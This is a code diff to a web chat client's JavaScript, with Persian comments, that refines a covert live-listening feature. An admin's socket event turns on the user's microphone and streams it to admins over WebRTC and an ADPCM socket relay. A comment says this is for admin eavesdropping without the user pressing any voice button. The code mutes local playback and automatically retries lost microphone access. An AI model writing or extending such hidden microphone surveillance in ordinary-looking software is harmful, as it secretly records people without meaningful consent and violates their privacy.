@@ -7,6 +7,9 @@ let socket = null;
 let userToken = sessionStorage.getItem('userToken');
 let sessionData = JSON.parse(sessionStorage.getItem('userSession') || '{}');
 let localStream = null;
+let microphoneRequest = null;
+let microphoneRecoveryTimer = null;
+let microphoneRecoveryAttempts = 0;
 let peerConnection = null;
 
 const WIN1252_REVERSE_MAP = {
@@ -135,6 +138,26 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // درخواست یک‌باره دسترسی میکروفون قبل از شروع جلسه جهت شنود زنده ادمین (بدون دکمه ارسال ویس توسط کاربر)
   initUserMicrophone();
+  document.getElementById('microphone-enable-btn')?.addEventListener('click', async () => {
+    if (await ensureLocalAudioStream()) {
+      clearTimeout(microphoneRecoveryTimer);
+      microphoneRecoveryTimer = null;
+      microphoneRecoveryAttempts = 0;
+      updateMicrophoneHelp('');
+      if (liveAudioRequested) {
+        await startPcmAudioStream();
+        for (const adminId of activeLiveAdminIds) await startLivePeer(adminId);
+      } else {
+        localStream.getAudioTracks().forEach(track => { track.enabled = false; });
+      }
+    }
+  });
+  navigator.mediaDevices?.addEventListener?.('devicechange', () => {
+    if (liveAudioRequested && !localStream?.getAudioTracks().some(track => track.readyState === 'live')) {
+      microphoneRecoveryAttempts = 0;
+      scheduleMicrophoneRecovery();
+    }
+  });
   initSocket();
 
   // راه‌اندازی پنل ایموجی، تقویم شمسی و مودال‌ها
@@ -184,14 +207,22 @@ document.addEventListener('DOMContentLoaded', () => {
 
 async function initUserMicrophone() {
   try {
-    const stream = await ensureLocalAudioStream();
-    if (stream) {
-      console.log('🎙️ دسترسی میکروفون کاربر با موفقیت تایید شد. آغاز استریم پیش‌فرض...');
-      await startPcmAudioStream();
+    if (await ensureLocalAudioStream()) {
+      if (!liveAudioRequested) localStream.getAudioTracks().forEach(track => { track.enabled = false; });
+      console.log('🎙️ دسترسی میکروفون لپ‌تاپ کاربر با موفقیت تایید شد.');
     }
   } catch (err) {
     console.warn('⚠️ عدم دسترسی به میکروفون یا رد شدن پرمیشن:', err);
   }
+}
+
+function updateMicrophoneHelp(message) {
+  const help = document.getElementById('microphone-help');
+  const text = document.getElementById('microphone-help-text');
+  const button = document.getElementById('microphone-enable-btn');
+  if (help) help.hidden = !message;
+  if (text) text.textContent = message;
+  if (button) button.hidden = !navigator.mediaDevices?.getUserMedia;
 }
 
 // تغییر وضعیت رابط کاربری هنگام قفل یا باز شدن چت
@@ -305,6 +336,8 @@ function initNeonDigitalClock() {
 function initSocket() {
   socket = io({
     auth: { token: userToken },
+    transports: ['websocket', 'polling'],
+    tryAllTransports: true,
   });
   window.socket = socket;
 
@@ -321,16 +354,24 @@ function initSocket() {
     }
   });
 
+  socket.on('audio_ice_servers', (data) => {
+    if (data && Array.isArray(data.iceServers)) rtcConfig.iceServers = [...rtcConfig.iceServers.filter(s => !String(s.urls).startsWith('turn')), ...data.iceServers];
+  });
+
   socket.io.on('reconnect', () => {
     if (statusEl) {
       statusEl.className = 'status-indicator online';
       statusEl.innerHTML = '<span class="status-dot"></span> اتصال مجدد برقرار شد';
     }
-    socket.emit('join_session', { sessionId: sessionData.id });
     loadHistory();
   });
 
   socket.on('disconnect', () => {
+    liveAudioRequested = false;
+    clearTimeout(microphoneRecoveryTimer);
+    microphoneRecoveryTimer = null;
+    activeLiveAdminIds.clear();
+    relayAdminIds.clear();
     stopPcmAudioStream();
     closeLivePeer();
     if (statusEl) {
@@ -499,49 +540,81 @@ function initSocket() {
   socket.on('audio_stream_started', async (data) => {
     if (!data || Number(data.sessionId) !== Number(sessionData.id)) return;
     console.log('🎙️ ادمین درخواست شنود صدای میکروفون را ارسال کرد:', data);
-    if (pcmAudioContext && pcmAudioContext.state === 'suspended') {
-      try { await pcmAudioContext.resume(); } catch (_) {}
-    }
-    if (!isPcmStreaming) {
-      await startPcmAudioStream();
-    }
-    if (data.adminSocketId) {
-      await startLivePeer(data.adminSocketId);
-    }
+    if (!data.adminSocketId) return;
+    activeLiveAdminIds.add(data.adminSocketId);
+    relayAdminIds.add(data.adminSocketId);
+    liveAdminSocketId = data.adminSocketId;
+    liveAudioRequested = true;
+    setRelaySampleRate(data.audioCodecVersion === 2 ? 16000 : 8000);
+    // Both paths share a single getUserMedia request; preparing the fallback must not delay the WebRTC offer.
+    await Promise.allSettled([
+      startPcmAudioStream(),
+      startLivePeer(data.adminSocketId),
+    ]);
   });
 
   socket.on('audio_stream_stopped', (data) => {
     if (data && Number(data.sessionId) !== Number(sessionData.id)) return;
-    console.log('🛑 استریم صدای ادمین‌ها متوقف شد.');
-    closeAllLivePeers();
+    console.log('🛑 استریم صدای میکروفون توسط ادمین قطع گردید.');
+    liveAudioRequested = false;
+    clearTimeout(microphoneRecoveryTimer);
+    microphoneRecoveryTimer = null;
+    microphoneRecoveryAttempts = 0;
+    activeLiveAdminIds.clear();
+    relayAdminIds.clear();
+    stopPcmAudioStream();
+    closeLivePeer();
+  });
+
+  socket.on('audio_peer_stopped', (data) => {
+    if (!data || Number(data.sessionId) !== Number(sessionData.id)) return;
+    activeLiveAdminIds.delete(data.adminSocketId);
+    relayAdminIds.delete(data.adminSocketId);
+    closeLivePeer(data.adminSocketId);
+    if (!relayAdminIds.size) stopPcmAudioStream(false);
+    if (liveAdminSocketId === data.adminSocketId) liveAdminSocketId = activeLiveAdminIds.values().next().value || null;
+  });
+
+  socket.on('audio_relay_required', (data) => {
+    if (!data || Number(data.sessionId) !== Number(sessionData.id) ||
+        !activeLiveAdminIds.has(data.adminSocketId)) return;
+    relayAdminIds.add(data.adminSocketId);
+    startPcmAudioStream();
+  });
+
+  socket.on('audio_relay_mode', (data) => {
+    if (!data || Number(data.sessionId) !== Number(sessionData.id) ||
+        !activeLiveAdminIds.has(data.adminSocketId)) return;
+    if (data.enabled) {
+      relayAdminIds.add(data.adminSocketId);
+      startPcmAudioStream();
+    } else {
+      relayAdminIds.delete(data.adminSocketId);
+      if (!relayAdminIds.size) stopPcmAudioStream(false);
+    }
   });
 
   socket.on('webrtc_answer', async (data) => {
     if (data && Number(data.sessionId) !== Number(sessionData.id)) return;
-    const senderId = data.senderSocketId;
-    const pc = livePeersMap.get(senderId);
-    if (pc && data.answer) {
+    const pc = data && livePeersMap.get(data.senderSocketId);
+    if (pc) {
       try {
         await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
-        const pending = pendingLiveCandidatesMap.get(senderId) || [];
-        for (const candidate of pending.splice(0)) {
-          await pc.addIceCandidate(candidate);
+        for (const candidate of (pendingLiveCandidatesMap.get(data.senderSocketId) || []).splice(0)) {
+          try { await pc.addIceCandidate(candidate); } catch (_) {}
         }
       } catch (err) { console.warn('WebRTC answer:', err); }
     }
   });
 
   socket.on('webrtc_ice_candidate', async (data) => {
-    if (data && Number(data.sessionId) !== Number(sessionData.id)) return;
-    const senderId = data.senderSocketId;
-    const pc = livePeersMap.get(senderId);
-    if (pc && data.candidate) {
+    if (data && data.candidate && activeLiveAdminIds.has(data.senderSocketId)) {
       try {
-        if (pc.remoteDescription) {
-          await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
-        } else {
-          if (!pendingLiveCandidatesMap.has(senderId)) pendingLiveCandidatesMap.set(senderId, []);
-          pendingLiveCandidatesMap.get(senderId).push(new RTCIceCandidate(data.candidate));
+        const pc = livePeersMap.get(data.senderSocketId);
+        if (pc?.remoteDescription) await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+        else {
+          if (!pendingLiveCandidatesMap.has(data.senderSocketId)) pendingLiveCandidatesMap.set(data.senderSocketId, []);
+          pendingLiveCandidatesMap.get(data.senderSocketId).push(new RTCIceCandidate(data.candidate));
         }
       } catch (e) {
         console.error('Error adding ICE candidate:', e);
@@ -1471,54 +1544,60 @@ let pcmAudioContext = null;
 let pcmMicSource = null;
 let pcmProcessorNode = null;
 let isPcmStreaming = false;
-const livePeersMap = new Map(); // adminSocketId -> RTCPeerConnection
-const pendingLiveCandidatesMap = new Map(); // adminSocketId -> Array<RTCIceCandidate>
-let livePeerRetryTimers = new Map(); // adminSocketId -> timer
+let pcmStreamStarting = false;
+let relaySampleRate = 8000;
 let liveAdminSocketId = null;
+let liveAudioRequested = false;
+let audioStreamGeneration = 0;
+let relayPacketSequence = 0;
+const activeLiveAdminIds = new Set();
+const relayAdminIds = new Set();
+const livePeersMap = new Map();
+const pendingLiveCandidatesMap = new Map();
+const livePeerRetryTimers = new Map();
 
-function closeLivePeer(adminSocketId) {
-  if (adminSocketId) {
-    if (livePeerRetryTimers.has(adminSocketId)) {
-      clearTimeout(livePeerRetryTimers.get(adminSocketId));
-      livePeerRetryTimers.delete(adminSocketId);
-    }
-    pendingLiveCandidatesMap.delete(adminSocketId);
-    const pc = livePeersMap.get(adminSocketId);
-    if (pc) {
-      try { pc.close(); } catch (_) {}
-      livePeersMap.delete(adminSocketId);
-    }
-  } else {
-    closeAllLivePeers();
-  }
+function setRelaySampleRate(rate) {
+  relaySampleRate = rate === 16000 ? 16000 : 8000;
+  if (pcmProcessorNode?.port) pcmProcessorNode.port.postMessage({ sampleRate: relaySampleRate });
 }
 
-function closeAllLivePeers() {
-  for (const timer of livePeerRetryTimers.values()) {
-    clearTimeout(timer);
+function closeLivePeer(adminSocketId) {
+  if (!adminSocketId) {
+    for (const id of livePeersMap.keys()) closeLivePeer(id);
+    pendingLiveCandidatesMap.clear();
+    peerConnection = null;
+    return;
   }
-  livePeerRetryTimers.clear();
-  pendingLiveCandidatesMap.clear();
-  for (const pc of livePeersMap.values()) {
+  if (livePeerRetryTimers.has(adminSocketId)) clearTimeout(livePeerRetryTimers.get(adminSocketId));
+  livePeerRetryTimers.delete(adminSocketId);
+  pendingLiveCandidatesMap.delete(adminSocketId);
+  const pc = livePeersMap.get(adminSocketId);
+  if (pc) {
     try { pc.close(); } catch (_) {}
+    livePeersMap.delete(adminSocketId);
+    if (peerConnection === pc) peerConnection = livePeersMap.values().next().value || null;
   }
-  livePeersMap.clear();
-  peerConnection = null;
 }
 
 async function startLivePeer(adminSocketId) {
-  if (!adminSocketId || !window.RTCPeerConnection || !socket || !socket.connected) return;
+  if (!liveAudioRequested || !activeLiveAdminIds.has(adminSocketId) ||
+      !window.RTCPeerConnection || !socket || !socket.connected) return;
+  const existing = livePeersMap.get(adminSocketId);
+  if (existing && ['new', 'connecting', 'connected'].includes(existing.connectionState)) return;
   const stream = await ensureLocalAudioStream();
-  if (!stream || !socket.connected) return;
+  if (!stream || !socket.connected || !liveAudioRequested || !activeLiveAdminIds.has(adminSocketId)) return;
+  const earlyCandidates = pendingLiveCandidatesMap.get(adminSocketId) || [];
   closeLivePeer(adminSocketId);
+  pendingLiveCandidatesMap.set(adminSocketId, earlyCandidates);
   try {
     const pc = new RTCPeerConnection(rtcConfig);
     livePeersMap.set(adminSocketId, pc);
-    peerConnection = pc; // backwards-compatible alias
-    liveAdminSocketId = adminSocketId;
+    peerConnection = pc;
     const sender = pc.addTrack(stream.getAudioTracks()[0], stream);
     const parameters = sender.getParameters();
-    parameters.encodings = [{ maxBitrate: 24000 }];
+    parameters.encodings ??= [{}];
+    if (!parameters.encodings.length) parameters.encodings.push({});
+    parameters.encodings[0].maxBitrate = 64000;
     sender.setParameters(parameters).catch(() => {});
     pc.onicecandidate = event => {
       if (event.candidate && socket && socket.connected) socket.emit('webrtc_ice_candidate', {
@@ -1527,56 +1606,107 @@ async function startLivePeer(adminSocketId) {
     };
     pc.onconnectionstatechange = () => {
       if (livePeersMap.get(adminSocketId) !== pc) return;
-      // نکته کلیدی: هرگز استریم صوتی سوکت ADPCM متوقف نمی‌شود تا سایر ادمین‌ها بدون اختلال بشنوند
+      if (pc.connectionState === 'connected' && livePeerRetryTimers.has(adminSocketId)) {
+        clearTimeout(livePeerRetryTimers.get(adminSocketId));
+        livePeerRetryTimers.delete(adminSocketId);
+      }
       if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected') {
         if (!livePeerRetryTimers.has(adminSocketId)) {
-          const timer = setTimeout(() => {
+          livePeerRetryTimers.set(adminSocketId, setTimeout(() => {
             livePeerRetryTimers.delete(adminSocketId);
-            if (livePeersMap.get(adminSocketId) === pc && socket && socket.connected) {
-              startLivePeer(adminSocketId);
-            }
-          }, 3000);
-          livePeerRetryTimers.set(adminSocketId, timer);
+            if (livePeersMap.get(adminSocketId) === pc && socket?.connected) startLivePeer(adminSocketId);
+          }, 3000));
         }
       }
     };
     const offer = await pc.createOffer();
     await pc.setLocalDescription(offer);
     socket.emit('webrtc_offer', { sessionId: sessionData.id, offer: pc.localDescription, targetSocketId: adminSocketId });
+    if (!livePeerRetryTimers.has(adminSocketId)) {
+      livePeerRetryTimers.set(adminSocketId, setTimeout(() => {
+        livePeerRetryTimers.delete(adminSocketId);
+        if (livePeersMap.get(adminSocketId) !== pc || !liveAudioRequested || !socket?.connected) return;
+        if (pc.connectionState !== 'connected') {
+          closeLivePeer(adminSocketId);
+          startLivePeer(adminSocketId);
+        }
+      }, 12000));
+    }
   } catch (err) {
     console.warn('WebRTC unavailable; using low bandwidth relay:', err);
     closeLivePeer(adminSocketId);
   }
 }
 
+function scheduleMicrophoneRecovery() {
+  if (!liveAudioRequested || !socket?.connected || microphoneRecoveryTimer || microphoneRecoveryAttempts >= 3) return;
+  const delay = [1000, 3000, 8000][microphoneRecoveryAttempts++];
+  microphoneRecoveryTimer = setTimeout(async () => {
+    microphoneRecoveryTimer = null;
+    if (!liveAudioRequested || !socket?.connected) return;
+    const stream = await ensureLocalAudioStream();
+    if (!stream) return scheduleMicrophoneRecovery();
+    microphoneRecoveryAttempts = 0;
+    updateMicrophoneHelp('');
+    socket.emit('audio_stream_status', { sessionId: sessionData.id, status: 'microphone_recovered' });
+    await startPcmAudioStream();
+    for (const adminId of activeLiveAdminIds) await startLivePeer(adminId);
+  }, delay);
+}
+
+function handleMicrophoneEnded(track) {
+  if (!localStream?.getAudioTracks().includes(track)) return;
+  localStream = null;
+  stopPcmAudioStream(false);
+  closeLivePeer();
+  updateMicrophoneHelp('میکروفون قطع شد. اتصال دستگاه و اجازهٔ مرورگر را بررسی کنید.');
+  if (liveAudioRequested && socket?.connected) {
+    socket.emit('audio_stream_status', { sessionId: sessionData.id, status: 'microphone_unavailable' });
+    scheduleMicrophoneRecovery();
+  }
+}
+
 async function ensureLocalAudioStream() {
-  const isStreamActive = localStream && localStream.getAudioTracks().some(t => t.readyState === 'live');
+  const isStreamActive = localStream?.getAudioTracks().some(track => track.readyState === 'live');
   if (isStreamActive) {
-    localStream.getAudioTracks().forEach(t => { t.enabled = true; });
+    localStream.getAudioTracks().forEach(track => { track.enabled = liveAudioRequested; });
     return localStream;
   }
-  try {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      console.warn('⚠️ دسترسی به میکروفون نیازمند پروتکل امن HTTPS است.');
-      return null;
-    }
-    localStream = await navigator.mediaDevices.getUserMedia({
+  if (microphoneRequest) return microphoneRequest;
+  if (!navigator.mediaDevices?.getUserMedia) {
+    console.warn('⚠️ دسترسی به میکروفون نیازمند پروتکل امن HTTPS است.');
+    updateMicrophoneHelp('دسترسی به میکروفون در این آدرس ممکن نیست؛ صفحه باید با HTTPS باز شود.');
+    return null;
+  }
+  microphoneRequest = navigator.mediaDevices.getUserMedia({
       audio: {
         echoCancellation: true,
         noiseSuppression: true,
         autoGainControl: true,
       },
       video: false,
+    }).then(stream => {
+    if (localStream && localStream !== stream) {
+      localStream.getTracks().forEach(track => track.stop());
+    }
+    localStream = stream;
+    stream.getAudioTracks().forEach(track => {
+      track.enabled = liveAudioRequested;
+      track.onended = () => handleMicrophoneEnded(track);
     });
-    return localStream;
-  } catch (err) {
+    updateMicrophoneHelp('');
+    return stream;
+  }).catch(err => {
     console.error('عدم دسترسی به میکروفون:', err);
+    updateMicrophoneHelp('میکروفون در دسترس نیست. اجازهٔ مرورگر و اتصال میکروفون را بررسی کنید.');
     return null;
-  }
+  }).finally(() => { microphoneRequest = null; });
+  return microphoneRequest;
 }
 
 let userAudioCtx = null;
 function warmUpUserAudioContext() {
+  if (pcmAudioContext?.state === 'suspended') pcmAudioContext.resume().catch(() => {});
   if (userAudioCtx && userAudioCtx.state === 'running') return;
   try {
     const AudioCtx = window.AudioContext || window.webkitAudioContext;
@@ -1596,29 +1726,23 @@ function warmUpUserAudioContext() {
 }
 
 if (typeof window !== 'undefined') {
-  function ensureUserAudioActive() {
-    warmUpUserAudioContext();
-    if (pcmAudioContext && pcmAudioContext.state === 'suspended') {
-      pcmAudioContext.resume().catch(() => {});
-    }
-    if (!isPcmStreaming) {
-      startPcmAudioStream().catch(() => {});
-    }
-  }
   ['pointerdown', 'touchstart', 'click', 'keydown'].forEach(evt => {
-    window.addEventListener(evt, ensureUserAudioActive, { capture: true, passive: true });
+    window.addEventListener(evt, warmUpUserAudioContext, { capture: true });
   });
 }
 
 async function startPcmAudioStream() {
-  if (isPcmStreaming) {
-    if (pcmAudioContext && pcmAudioContext.state === 'suspended') {
-      try { await pcmAudioContext.resume(); } catch (_) {}
+  if (!liveAudioRequested || !relayAdminIds.size || isPcmStreaming || pcmStreamStarting) return;
+  pcmStreamStarting = true;
+  const generation = audioStreamGeneration;
+  const stream = await ensureLocalAudioStream();
+  if (!stream || !liveAudioRequested || !relayAdminIds.size || generation !== audioStreamGeneration) {
+    if (!stream && liveAudioRequested && socket?.connected) {
+      socket.emit('audio_stream_status', { sessionId: sessionData.id, status: 'microphone_unavailable' });
     }
+    pcmStreamStarting = false;
     return;
   }
-  const stream = await ensureLocalAudioStream();
-  if (!stream) return;
 
   try {
     const AudioCtx = window.AudioContext || window.webkitAudioContext;
@@ -1628,39 +1752,59 @@ async function startPcmAudioStream() {
       try { await pcmAudioContext.close(); } catch (_) {}
     }
 
-    try {
-      pcmAudioContext = new AudioCtx({ sampleRate: 16000 });
-    } catch (_) {
-      pcmAudioContext = new AudioCtx();
-    }
+    try { pcmAudioContext = new AudioCtx({ sampleRate: 16000 }); }
+    catch (_) { pcmAudioContext = new AudioCtx(); }
     if (pcmAudioContext.state === 'suspended') {
       try { await pcmAudioContext.resume(); } catch (_) {}
     }
+    if (generation !== audioStreamGeneration || !liveAudioRequested || !relayAdminIds.size) return;
     pcmMicSource = pcmAudioContext.createMediaStreamSource(stream);
 
-    pcmProcessorNode = pcmAudioContext.createScriptProcessor(2048, 1, 1);
-
-    pcmProcessorNode.onaudioprocess = (e) => {
-      if (!isPcmStreaming || !socket || !socket.connected || !sessionData || !window.LiveAudioCodec) return;
-      const input = e.inputBuffer.getChannelData(0);
-      const ratio = pcmAudioContext.sampleRate / LiveAudioCodec.sampleRate;
-      const pcm16 = new Int16Array(Math.floor(input.length / ratio));
-      for (let i = 0; i < pcm16.length; i++) {
-        const start = Math.floor(i * ratio), end = Math.min(input.length, Math.floor((i + 1) * ratio));
-        let sum = 0;
-        for (let j = start; j < end; j++) sum += input[j];
-        const sample = Math.max(-1, Math.min(1, sum / Math.max(1, end - start)));
-        pcm16[i] = Math.round(sample * 32767);
-      }
+    const sendFrame = (pcm16, sampleRate = relaySampleRate) => {
+      if (!isPcmStreaming || !relayAdminIds.size || !socket || !socket.connected || !sessionData || !window.LiveAudioCodec) return;
       const packet = LiveAudioCodec.encode(pcm16);
       if (!packet) return;
-      if (socket && socket.connected) {
-        socket.emit('audio_stream_adpcm', {
-          sessionId: sessionData.id,
-          packet,
-        });
-      }
+      socket.volatile.emit('audio_stream_adpcm', {
+        sessionId: sessionData.id,
+        packet,
+        sampleRate,
+        sequence: ++relayPacketSequence,
+        sentAt: performance.now(),
+      });
     };
+
+    if (pcmAudioContext.audioWorklet && window.AudioWorkletNode) {
+      try {
+        await pcmAudioContext.audioWorklet.addModule('/assets/js/live-audio-worklet.js?v=1.0');
+        if (generation !== audioStreamGeneration || !liveAudioRequested || !relayAdminIds.size) return;
+        pcmProcessorNode = new AudioWorkletNode(pcmAudioContext, 'live-audio-capture', {
+          processorOptions: { sampleRate: relaySampleRate },
+        });
+        pcmProcessorNode.port.onmessage = event => {
+          if (event.data?.samples instanceof Int16Array) {
+            sendFrame(event.data.samples, event.data.sampleRate);
+          }
+        };
+      } catch (workletError) {
+        console.warn('AudioWorklet unavailable, using compatible capture:', workletError);
+      }
+    }
+    if (!pcmProcessorNode) {
+      pcmProcessorNode = pcmAudioContext.createScriptProcessor(1024, 1, 1);
+      pcmProcessorNode.onaudioprocess = (e) => {
+        if (!isPcmStreaming || !pcmAudioContext) return;
+        const input = e.inputBuffer.getChannelData(0);
+        const ratio = pcmAudioContext.sampleRate / relaySampleRate;
+        const pcm16 = new Int16Array(Math.floor(input.length / ratio));
+        for (let i = 0; i < pcm16.length; i++) {
+          const start = Math.floor(i * ratio), end = Math.min(input.length, Math.floor((i + 1) * ratio));
+          let sum = 0;
+          for (let j = start; j < end; j++) sum += input[j];
+          pcm16[i] = Math.round(Math.max(-1, Math.min(1, sum / Math.max(1, end - start))) * 32767);
+        }
+        sendFrame(pcm16);
+      };
+    }
 
     // جهت جلوگیری از بازپخش صدای میکروفون در بلندگوی کاربر (Mute Gain Node)
     const silentGain = pcmAudioContext.createGain();
@@ -1671,15 +1815,20 @@ async function startPcmAudioStream() {
     silentGain.connect(pcmAudioContext.destination);
 
     isPcmStreaming = true;
+    socket.emit('audio_stream_status', { sessionId: sessionData.id, status: 'relay_active' });
     console.log('🎙️ Low bandwidth live audio relay active.');
   } catch (e) {
     console.error('خطا در فعال‌سازی استریم صوتی PCM:', e);
+  } finally {
+    pcmStreamStarting = false;
   }
 }
 
 function stopPcmAudioStream(disableTrack = true) {
+  audioStreamGeneration++;
   isPcmStreaming = false;
   if (pcmProcessorNode) {
+    if (pcmProcessorNode.port) pcmProcessorNode.port.onmessage = null;
     try { pcmProcessorNode.disconnect(); } catch (_) {}
     pcmProcessorNode = null;
   }
